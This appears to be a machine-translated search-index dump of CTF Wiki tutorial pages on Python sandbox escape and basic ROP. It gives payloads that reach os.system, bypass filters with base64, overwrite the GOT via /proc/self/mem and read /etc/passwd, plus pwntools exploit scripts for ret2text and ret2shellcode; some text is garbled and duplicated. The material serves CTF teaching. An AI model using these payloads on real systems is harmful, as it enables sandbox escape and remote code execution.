to import modules in Python (xxx is the module name): import xxx from xxx import * __import__('xxx') We can import the relevant modules through the above import method and use the above functions to implement the command execution. In addition to this, we can also import modules via path : For example, in Linux system, the path of Python's os module is generally in /usr/lib/python2.7/os.py . When you know the path, we can import the module by the following operations, and then further use the relevant function. >>> import sys >>> sys . modules [ 'os' ] = '/usr/lib/python2.7/os.py' & gt ; & gt ; & gt ; import the >>> Other dangerous function examples Such as execfile file execution >>> execfile ( '/usr/lib/python2.7/os.py' ) >>> system ( 'cat /etc/passwd' ) root : x : 0 : 0 : root : / root : / bin / bash daemon : x : 1 : 1 : daemon : / usr / sbin : / usr / sbin / nologin bin : x : 2 : 2 : bin : / bin : / usr / sbin / nologin sys : x : 3 : 3 : sys : / dev : / usr / sbin / nologin ... >>> getcwd () '/usr/lib/python2.7' timeit import timeit timeit . timeit ( \"__import__('os').system('dir')\" , number = 1 ) exec and eval are more classic eval ( '__import__(\"os\").system(\"dir\")' ) platform import platform print platform . popen ( 'dir' ) . read () However, the normal Python sandbox will blacklist the use of modules such as os or whitelists that only allow users to use the sandbox-provided modules to prevent dangerous operations. How to further escape the sandbox is our key research content. Python's built-in functions \u00b6 When we can't import modules, or the modules we want to import are banned, then we can only look for Python's own built-in functions (that is, functions that are usually imported without default, and Python itself has been imported by default). We can get a list of built-in functions by using dir __builtin__ & gt ; & gt ; & gt ; say ( __ builtins__ ) [ 'ArithmeticError' , 'AssertionError' , 'AttributeError' , 'BaseException' , 'BufferError' , 'BytesWarning' , 'DeprecationWarning' , 'EOFError' , 'Ellipsis' , 'EnvironmentError' , 'Exception' , 'False' , 'FloatingPointError' , 'FutureWarning' , 'GeneratorExit' , 'IOError' , 'ImportError' , 'ImportWarning' , 'IndentationError' , 'IndexError' , 'KeyError' , 'KeyboardInterrupt' , 'LookupError' , 'MemoryError' , 'NameError' , 'None' , 'NotImplemented' , 'NotImplementedError' , 'OSError' , 'OverflowError' , 'PendingDeprecationWarning' , 'ReferenceError' , 'RuntimeError' , 'RuntimeWarning' , 'StandardError' , 'StopIteration' , 'SyntaxError' , 'SyntaxWarning' , 'SystemError' , 'SystemExit' , 'TabError' , 'True' , 'TypeError' , 'UnboundLocalError' , 'UnicodeDecodeError' , 'UnicodeEncodeError' , 'UnicodeError' , 'UnicodeTranslateError' , 'UnicodeWarning' , 'UserWarning' , 'ValueError' , 'Warning' , 'ZeroDivisionError' , '_' , '__debug__' , '__doc__' , '__import__' , '__name__' , '__package__' , 'abs' , 'all' , 'any' , 'apply' , 'basestring' , 'bin' , 'bool' , 'buffer' , 'bytearray' , 'bytes' , 'callable' , 'chr' , 'classmethod' , 'cmp' , 'coerce' , 'compile' , 'complex' , 'copyright' , 'credits' , 'delattr' , 'dict' , 'dir' , 'divmod' , 'enumerate' , 'eval' , 'execfile' , 'exit' , 'file' , 'filter' , 'float' , 'format' , 'frozenset' , 'getattr' , 'globals' , 'hasattr' , 'hash' , 'help' , 'hex' , 'id' , 'input' , 'int' , 'intern' , 'isinstance' , 'issubclass' , 'iter' , 'len' , 'license' , 'list' , 'locals' , 'long' , 'map' , 'max' , 'memoryview' , 'min' , 'next' , 'object' , 'oct' , 'open' , 'ord' , 'pow' , 'print' , 'property' , 'quit' , 'range' , 'raw_input' , 'reduce' , 'reload' , 'repr' , 'reversed' , 'round' , 'set' , 'setattr' , 'slice' , 'sorted' , 'staticmethod' , 'str' , 'sum' , 'super' , 'tuple' , 'type' , 'unichr' , 'unicode' , 'vars' , 'xrange' , 'zip' ] In Python, built-in functions that do not introduce direct use are called builtin functions, and are automatically introduced into the environment with the _builtin__ module. So how do we introduce the module? We can introduce the modules we want to introduce by dict . The role of dict is to list all the properties and functions below a module/class/object. This is useful in sandbox escapes, you can find some things hidden in it. dict What can I do? We know that a module object has a namespace implemented by a dictionary object, and a reference to the property is converted to a lookup in the dictionary. For example, mx is equivalent to m.dict[\"x\"]. Bypass the instance: First pass the base64 bypass character plaintext detection >>> import base64 >>> base64 . b64encode ( '__import__' ) 'X19pbXBvcnRfXw==' & gt ; & gt ; & gt ; base64 . b64encode ( & #39;os&#39;) & #39;b3M =&#39; Then quoted by dict >>> __builtins__ . __dict__ [ 'X19pbXBvcnRfXw==' . decode ( 'base64' )]( 'b3M=' . decode ( 'base64' )) If some introverted functions are removed in builtins , we can reload them by reload( builtins ) to get a complete builtins * Creating objects and references \u00b6 There are a lot of basic functions integrated in Python's object class, and we can also refer to it by creating objects when we want to call them. We have two common methods: () .__class__.__bases__ [ 0 ] '' .__class__.__mro__ [ 2 ] For example, we can pass print ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/services&quot;).read() achieves the effect of file reading, Common payload #\u8bfb\u6587\u4ef6 () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( r 'C:\\1.php' ) . read () #Write file () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/var/www/html/input' , 'w' ) . write ( '123' ) #Execute arbitrary commands () . __ class __ . __ bases __ [ 0 ] . __ subclasses __ () [ 59 ] . __ init __ . func_globals . values () [ 13 ] [ & #39;eval&#39;] (&#39;__ import __ (&quot;os&quot;). popen (&quot;ls / var / www / html &quot;). read () &#39;) Indirect reference \u00b6 In some topics, such as the Python sandbox issue of the 2018 National Tournament, the import is actually castrated. But in Python, the native import is referenced, as long as we find the relevant object reference, we can further get what we want, the following demo will tell you writeModify got table \u00b6 Is actually a memory operation method of /proc/self/mem /proc/self/mem is a memory image that can be used to read and write all the memory of the process, including executable code. If we can get the offset of some functions of Python, such as system , We can then override the purpose of getshell by overriding the got. ( lambda r , w : r . seek ( 0x08de2b8 ) or w . seek ( 0x08de8c8 ) or w . write ( r . read ( 8 )) or () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( 'c' + 'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb' ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'r' ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'w' , 0 )) The first address is the offset of system, the second is the offset of fopen, we can get the relevant information through objdump example2018 ciscn Python sandbox escape in the National University Information Security Competition. \u00b6 We can get the title source by print ().__class__.__bases__[0].__subclasses__()[40](&quot;/home/ctf/sandbox.py&quot;).read() , and then we can further analyze it. An escape method. Creating objects and using Python to manipulate string characteristics \u00b6 x = [ x for x in [] . __class__ . __base__ . __subclasses__ () if x . __name__ == 'ca' + 'tch_warnings' ][ 0 ] . __init__ x . __getattribute__ ( \"func_global\" + \"s\" )[ 'linecache' ] . __dict__ [ 'o' + 's' ] . __dict__ [ 'sy' + 'stem' ]( 'l' + 's' ) x . __getattribute__ ( \"func_global\" + \"s\" )[ 'linecache' ] . __dict__ [ 'o' + 's' ] . __dict__ [ 'sy' + 'stem' ]( 'l' + 's /home/ctf' ) x . __getattribute__ ( \"func_global\" + \"s\" )[ 'linecache' ] . __dict__ [ 'o' + 's' ] . __dict__ [ 'sy' + 'stem' ]( 'ca' + 't /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb' ) Hijack got table getshell \u00b6 ( lambda r , w : r . seek ( 0x08de2b8 ) or w . seek ( 0x08de8c8 ) or w . write ( r . read ( 8 )) or () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( 'l' + 's /home/ctf/' ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'r' ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'w' , 0 )) ( lambda r , w : r . seek ( 0x08de2b8 ) or w . seek ( 0x08de8c8 ) or w . write ( r . read ( 8 )) or () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( 'c' + 'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb' ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'r' ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'w' , 0 )) Looking for an indirect reference to import \u00b6 In the continuous dir process, I found that closure this object saves the parameters, you can refer to the native import print __import__ . __getattribute__ ( '__clo' + 'sure__' )[ 0 ] . cell_contents ( 'o' + 's' ) . __getattribute__ ( 'sy' + 'stem' )( 'l' + 's home' ) \u53c2\u8003 \u00b6 https://xz.aliyun.com/t/52#toc-10 https://blog.csdn.net/qq_35078631/article/details/78504415 https://www.anquanke.com/post/id/85571 http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01","title":"Python Sandbox Escape"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#python-sandbox","text":"The so-called Python sandbox, in a certain way to simulate the Python terminal, to achieve user use of Python.","title":"Python sandbox"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#python-sandbox-escape-some-ways","text":"What we usually call Python sandbox escaping is to bypass the simulated Python terminal and ultimately implement command execution.","title":"Python Sandbox Escape Some Ways"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#import-module","text":"In Python's built-in functions, there are some functions that help us implement arbitrary command execution: os.system () os.popen () commands.getstatusoutput() commands.getoutput() commands.getstatus() subprocess.call(command, shell=True) subprocess.Popen(command, shell=True) pty.spawn() There are usually three ways to import modules in Python (xxx is the module name): import xxx from xxx import * __import__('xxx') We can import the relevant modules through the above import method and use the above functions to implement the command execution. In addition to this, we can also import modules via path : For example, in Linux system, the path of Python's os module is generally in /usr/lib/python2.7/os.py . When you know the path, we can import the module by the following operations, and then further use the relevant function. >>> import sys >>> sys . modules [ 'os' ] = '/usr/lib/python2.7/os.py' & gt ; & gt ; & gt ; import the >>> Other dangerous function examples Such as execfile file execution >>> execfile ( '/usr/lib/python2.7/os.py' ) >>> system ( 'cat /etc/passwd' ) root : x : 0 : 0 : root : / root : / bin / bash daemon : x : 1 : 1 : daemon : / usr / sbin : / usr / sbin / nologin bin : x : 2 : 2 : bin : / bin : / usr / sbin / nologin sys : x : 3 : 3 : sys : / dev : / usr / sbin / nologin ... >>> getcwd () '/usr/lib/python2.7' timeit import timeit timeit . timeit ( \"__import__('os').system('dir')\" , number = 1 ) exec and eval are more classic eval ( '__import__(\"os\").system(\"dir\")' ) platform import platform print platform . popen ( 'dir' ) . read () However, the normal Python sandbox will blacklist the use of modules such as os or whitelists that only allow users to use the sandbox-provided modules to prevent dangerous operations. How to further escape the sandbox is our key research content.","title":"Import module"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#pythons-built-in-functions","text":"When we can't import modules, or the modules we want to import are banned, then we can only look for Python's own built-in functions (that is, functions that are usually imported without default, and Python itself has been imported by default). We can get a list of built-in functions by using dir __builtin__ & gt ; & gt ; & gt ; say ( __ builtins__ ) [ 'ArithmeticError' , 'AssertionError' , 'AttributeError' , 'BaseException' , 'BufferError' , 'BytesWarning' , 'DeprecationWarning' , 'EOFError' , 'Ellipsis' , 'EnvironmentError' , 'Exception' , 'False' , 'FloatingPointError' , 'FutureWarning' , 'GeneratorExit' , 'IOError' , 'ImportError' , 'ImportWarning' , 'IndentationError' , 'IndexError' , 'KeyError' , 'KeyboardInterrupt' , 'LookupError' , 'MemoryError' , 'NameError' , 'None' , 'NotImplemented' , 'NotImplementedError' , 'OSError' , 'OverflowError' , 'PendingDeprecationWarning' , 'ReferenceError' , 'RuntimeError' , 'RuntimeWarning' , 'StandardError' , 'StopIteration' , 'SyntaxError' , 'SyntaxWarning' , 'SystemError' , 'SystemExit' , 'TabError' , 'True' , 'TypeError' , 'UnboundLocalError' , 'UnicodeDecodeError' , 'UnicodeEncodeError' , 'UnicodeError' , 'UnicodeTranslateError' , 'UnicodeWarning' , 'UserWarning' , 'ValueError' , 'Warning' , 'ZeroDivisionError' , '_' , '__debug__' , '__doc__' , '__import__' , '__name__' , '__package__' , 'abs' , 'all' , 'any' , 'apply' , 'basestring' , 'bin' , 'bool' , 'buffer' , 'bytearray' , 'bytes' , 'callable' , 'chr' , 'classmethod' , 'cmp' , 'coerce' , 'compile' , 'complex' , 'copyright' , 'credits' , 'delattr' , 'dict' , 'dir' , 'divmod' , 'enumerate' , 'eval' , 'execfile' , 'exit' , 'file' , 'filter' , 'float' , 'format' , 'frozenset' , 'getattr' , 'globals' , 'hasattr' , 'hash' , 'help' , 'hex' , 'id' , 'input' , 'int' , 'intern' , 'isinstance' , 'issubclass' , 'iter' , 'len' , 'license' , 'list' , 'locals' , 'long' , 'map' , 'max' , 'memoryview' , 'min' , 'next' , 'object' , 'oct' , 'open' , 'ord' , 'pow' , 'print' , 'property' , 'quit' , 'range' , 'raw_input' , 'reduce' , 'reload' , 'repr' , 'reversed' , 'round' , 'set' , 'setattr' , 'slice' , 'sorted' , 'staticmethod' , 'str' , 'sum' , 'super' , 'tuple' , 'type' , 'unichr' , 'unicode' , 'vars' , 'xrange' , 'zip' ] In Python, built-in functions that do not introduce direct use are called builtin functions, and are automatically introduced into the environment with the _builtin__ module. So how do we introduce the module? We can introduce the modules we want to introduce by dict . The role of dict is to list all the properties and functions below a module/class/object. This is useful in sandbox escapes, you can find some things hidden in it. dict What can I do? We know that a module object has a namespace implemented by a dictionary object, and a reference to the property is converted to a lookup in the dictionary. For example, mx is equivalent to m.dict[\"x\"]. Bypass the instance: First pass the base64 bypass character plaintext detection >>> import base64 >>> base64 . b64encode ( '__import__' ) 'X19pbXBvcnRfXw==' & gt ; & gt ; & gt ; base64 . b64encode ( & #39;os&#39;) & #39;b3M =&#39; Then quoted by dict >>> __builtins__ . __dict__ [ 'X19pbXBvcnRfXw==' . decode ( 'base64' )]( 'b3M=' . decode ( 'base64' )) If some introverted functions are removed in builtins , we can reload them by reload( builtins ) to get a complete builtins *","title":"Python&#39;s built-in functions"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#creating-objects-and-references","text":"There are a lot of basic functions integrated in Python's object class, and we can also refer to it by creating objects when we want to call them. We have two common methods: () .__class__.__bases__ [ 0 ] '' .__class__.__mro__ [ 2 ] For example, we can pass print ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/services&quot;).read() achieves the effect of file reading, Common payload #\u8bfb\u6587\u4ef6 () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( r 'C:\\1.php' ) . read () #Write file () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/var/www/html/input' , 'w' ) . write ( '123' ) #Execute arbitrary commands () . __ class __ . __ bases __ [ 0 ] . __ subclasses __ () [ 59 ] . __ init __ . func_globals . values () [ 13 ] [ & #39;eval&#39;] (&#39;__ import __ (&quot;os&quot;). popen (&quot;ls / var / www / html &quot;). read () &#39;)","title":"Creating objects and references"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#indirect-reference","text":"In some topics, such as the Python sandbox issue of the 2018 National Tournament, the import is actually castrated. But in Python, the native import is referenced, as long as we find the relevant object reference, we can further get what we want, the following demo will tell you","title":"Indirect reference"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#writemodify-got-table","text":"Is actually a memory operation method of /proc/self/mem /proc/self/mem is a memory image that can be used to read and write all the memory of the process, including executable code. If we can get the offset of some functions of Python, such as system , We can then override the purpose of getshell by overriding the got. ( lambda r , w : r . seek ( 0x08de2b8 ) or w . seek ( 0x08de8c8 ) or w . write ( r . read ( 8 )) or () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( 'c' + 'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb' ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'r' ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'w' , 0 )) The first address is the offset of system, the second is the offset of fopen, we can get the relevant information through objdump","title":"writeModify got table"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#example2018-ciscn-python-sandbox-escape-in-the-national-university-information-security-competition","text":"We can get the title source by print ().__class__.__bases__[0].__subclasses__()[40](&quot;/home/ctf/sandbox.py&quot;).read() , and then we can further analyze it. An escape method.","title":"example2018 ciscn Python sandbox escape in the National University Information Security Competition."},{"location":"pwn/linux/sandbox/python-sandbox-escape/#creating-objects-and-using-python-to-manipulate-string-characteristics","text":"x = [ x for x in [] . __class__ . __base__ . __subclasses__ () if x . __name__ == 'ca' + 'tch_warnings' ][ 0 ] . __init__ x . __getattribute__ ( \"func_global\" + \"s\" )[ 'linecache' ] . __dict__ [ 'o' + 's' ] . __dict__ [ 'sy' + 'stem' ]( 'l' + 's' ) x . __getattribute__ ( \"func_global\" + \"s\" )[ 'linecache' ] . __dict__ [ 'o' + 's' ] . __dict__ [ 'sy' + 'stem' ]( 'l' + 's /home/ctf' ) x . __getattribute__ ( \"func_global\" + \"s\" )[ 'linecache' ] . __dict__ [ 'o' + 's' ] . __dict__ [ 'sy' + 'stem' ]( 'ca' + 't /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb' )","title":"Creating objects and using Python to manipulate string characteristics"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#hijack-got-table-getshell","text":"( lambda r , w : r . seek ( 0x08de2b8 ) or w . seek ( 0x08de8c8 ) or w . write ( r . read ( 8 )) or () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( 'l' + 's /home/ctf/' ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'r' ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'w' , 0 )) ( lambda r , w : r . seek ( 0x08de2b8 ) or w . seek ( 0x08de8c8 ) or w . write ( r . read ( 8 )) or () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( 'c' + 'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb' ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'r' ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'w' , 0 ))","title":"Hijack got table getshell"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#looking-for-an-indirect-reference-to-import","text":"In the continuous dir process, I found that closure this object saves the parameters, you can refer to the native import print __import__ . __getattribute__ ( '__clo' + 'sure__' )[ 0 ] . cell_contents ( 'o' + 's' ) . __getattribute__ ( 'sy' + 'stem' )( 'l' + 's home' )","title":"Looking for an indirect reference to import"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#_1","text":"https://xz.aliyun.com/t/52#toc-10 https://blog.csdn.net/qq_35078631/article/details/78504415 https://www.anquanke.com/post/id/85571 http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01","title":"\u53c2\u8003"},{"location":"pwn/linux/stackoverflow/basic-rop/","text":"\u57fa\u672cROP \u00b6 With the NX protection turned on, it is difficult to continue to directly inject code directly into the stack or heap. Attackers have also proposed corresponding methods to bypass protection. At present, the main one is ROP (Return Oriented Programming). The main idea is to use the existing small fragments in the program based on the stack buffer overflow. ) to change the value of some registers or variables to control the execution flow of the program. The so-called gadgets are sequences of instructions ending in ret. Through these sequences of instructions, we can modify the contents of certain addresses to facilitate the control program execution process. It is called ROP because the core is to use the ret instruction in the instruction set to change the order in which the instruction stream is executed. ROP attacks generally have to satisfy the following conditions The program has an overflow and can control the return address. You can find the gadgets that meet the criteria and the address of the corresponding gadgets. If the address of the gadgets is not fixed every time, then we need to find a way to dynamically get the corresponding address. ret2text \u00b6 Principle \u00b6 Ret2text is the code (.text) that the control program executes the program itself. In fact, this method of attack is a general description. When we control the existing code of the execution program, we can also control the program to execute several pieces of code (that is, gadgets) of non-adjacent programs. This is what we want to say about ROP. At this point, we need to know the location of the corresponding returned code. Of course, the program may also open some protection, we need to find a way to bypass these protections. Examples \u00b6 In fact, in the basic principle of stack overflow, we have introduced this simple attack. Here, let's give another example, the example of ret2text used in Bamboofox to introduce ROP. \u70b9\u51fb\u4e0b\u8f7d: ret2text First, check out the protection mechanism of the program. \u279c ret2text checksec ret2text Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) It can be seen that the program is a 32-bit program that only turns on stack unexecutable protection. Then we use IDA to view the source code. int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( _bss_start , 0 , 1 , 0 ); puts ( \"There is something amazing here, do you know anything?\" ); gets (( char * ) & amp ; v4 ); printf ( \"Maybe I will tell you next time !\" ); return 0 ; } It can be seen that the program uses the gets function in the main function, and obviously there is a stack overflow vulnerability. Later discovered ` asm .text:080485FD secure proc near .text:080485FD .text:080485FD input = dword ptr -10h .text:080485FD secretcode = dword ptr -0Ch .text:080485FD .text:080485FD push ebp .text:080485FE mov ebp, esp .text:08048600 sub esp, 28h .text:08048603 mov dword ptr [esp], 0 ; timer .text:0804860A call _time .text:0804860F mov [esp], eax ; seed .text:08048612 call _srand .text:08048617 call _rand .text:0804861C mov [ebp+secretcode], eax .text:0804861F lea eax, [ebp+input] .text:08048622 mov [esp+4], eax .text:08048626 mov dword ptr [esp], offset unk_8048760 .text:0804862D call ___isoc99_scanf .text:08048632 mov eax, [ebp+input] .text:08048635 cmp eax, [ebp+secretcode] .text:08048638 jnz short locret_8048646 .text:0804863A mov dword ptr [esp], offset command ; \"/bin/sh\" .text:08048641 call _system In the secure function, it is found that there is code calling system(&quot;/bin/sh&quot;), then if we directly control the program to return to 0x0804863A, then we can get the system shell. Here&#39;s how we construct the payload. The first thing we need to determine is the number of bytes from the start address of the memory we can control from the return address of the main function. `` `asm .text:080486A7 lea eax, [esp+1Ch] .text:080486AB mov [esp], eax ; s .text:080486AE call _gets You can see that the string is indexed relative to esp, so we need to debug, put the breakpoint at the call, view esp, ebp, as follows gef\u27a4 b *0x080486AE Breakpoint 1 at 0x80486ae: file ret2text.c, line 24 . gef\u27a4 r There is something amazing here, do you know anything? Breakpoint 1 , 0x080486ae in main () at ret2text.c:24 24 gets ( buf ) ; \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ registers ] \u2500\u2500\u2500\u2500 $eax : 0xffffcd5c \u2192 0x08048329 \u2192 \"__libc_start_main\" $ebx : 0x00000000 $ ecx: 0xffffffff $edx : 0xf7faf870 \u2192 0x00000000 $esp : 0xffffcd40 \u2192 0xffffcd5c \u2192 0x08048329 \u2192 \"__libc_start_main\" $ebp : 0xffffcdc8 \u2192 0x00000000 $ you are: 0xf7fae000 \u2192 0x001b1db0 $ edi: 0xf7fae000 \u2192 0x001b1db0 $ Eip: 0x080486ae \u2192 <main+102> call 0x8048460 <gets@plt> You can see that esp is 0xffffcd40, ebp is the specific payload as follows 0xffffcdc8, and the index of s relative to esp is [esp+0x1c], so the address of s is 0xffffcd5c, so the offset of s relative to ebp is 0x6C, so the relative The offset from the return address is 0x6c+4. The final payload is as follows: ##!/usr/bin/env python from pwn import * sh = process ( './ret2text' ) target = 0x804863a sh . sendline ( 'A' * ( 0x6c + 4 ) + p32 ( target )) sh . interactive () ret2shellcode \u00b6 Principle \u00b6 Ret2shellcode, which controls the program to execute shellcode code. Shellcode refers to the assembly code used to complete a function. The common function is to get the shell of the target system. In general, shellcode needs to be populated by ourselves. This is actually another typical use, that is, we need to fill in some executable code at this time. On the basis of the stack overflow, in order to execute the shellcode, the corresponding binary is required at runtime, and the area where the shellcode is located has executable permissions. Examples \u00b6 Here we take ret2shellcode in bamboofox as an example. \u70b9\u51fb\u4e0b\u8f7d: ret2shellcode First check the protection of the program open \u279c ret2shellcode checksec ret2shellcode Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE ( 0x8048000 ) RWX: Has RWX segments It can be seen that the source program has almost no protection turned on, and is readable, writable, and executable. Let's look at the program again using IDA. int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stdin , 0 , 1 , 0 ); puts ( \"No system for you this time !!!\" ); gets (( char * ) & amp ; v4 ); strncpy ( buf2 , ( const char * ) & v4 , 0x64u ); printf ( \"bye bye ~\" ); return 0 ; } It can be seen that the program is still a basic stack overflow vulnerability, but this time also copy the corresponding string to buf2. A simple view shows that buf2 is in the bss section. ` asm .bss:0804A080 public buf2 .bss:0804A080 ; char buf2[100] At this point, we simply debug the program to see if this bss section is executable. ```shell gef\u27a4 b main Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8. gef\u27a4 r Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode Breakpoint 1, main () at ret2shellcode.c:8 8 setvbuf(stdout, 0LL, 2, 0LL); \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ source:ret2shellcode.c+8 ]\u2500\u2500\u2500\u2500 6 int main(void) 7 { \u2192 8 setvbuf(stdout, 0LL, 2, 0LL); 9 setvbuf(stdin, 0LL, 1, 0LL); 10 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 [#0] 0x8048536 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 vmmap Start End Offset Perm Path 0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so 0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so 0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so 0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so 0xf7faf000 0xf7fb2000 0x00000000 rwx 0xf7fd3000 0xf7fd5000 0x00000000 rwx 0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar] 0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso] 0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so 0xf7ffb000 0xf7ffc000 0x00000000 rwx 0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so 0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so 0xfffdd000 0xffffe000 0x00000000 rwx [stack] Through vmmap, we can see that the segment corresponding to the bss segment has executable permissions. 0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode So this time we control the program to execute the shellcode, which is to read the shellcode, and then control the program to execute the shellcode at the bss section. Among them, the corresponding offset calculation is similar to the example in ret2text. The specific payload is as follows #!/usr/bin/env python from pwn import * sh = process ( './ret2shellcode' ) shellcode = asm ( shellcraft . sh ()) buf2_addr = 0x804a080 sh . sendline ( shellcode . ljust ( 112 , 'A' ) + p32 ( buf2_addr )) sh . interactive () Title \u00b6 sniperoj-pwn100-shellcode-x86-64 ret2syscall \u00b6 Principle \u00b6 Ret2syscall, that is, the control program executes the system call and gets the shell. Examples 